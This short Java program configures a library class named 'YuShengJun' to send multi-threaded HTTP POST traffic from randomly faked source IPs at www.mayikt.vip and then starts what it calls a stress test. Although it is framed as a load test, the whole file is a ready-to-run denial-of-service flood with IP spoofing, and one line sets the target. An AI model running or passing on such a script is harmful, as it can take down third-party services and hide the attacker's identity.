import vip.mayikt.YuShengJun;
public class Main {
    public static void main(String[] args) {
        YuShengJun yuShengJun = new YuShengJun();
        yuShengJun.RequestMode = YuShengJun.HTTP.POST;
        yuShengJun.FakeIPmode = YuShengJun.FakeIPMode.Random;
        yuShengJun.TargetIP = yuShengJun.GetIP("www.mayikt.vip");
        yuShengJun.ThreadNum = Runtime.getRuntime().availableProcessors()*2;
        yuShengJun.size = 1000;
        yuShengJun.StreetTest();
    }
}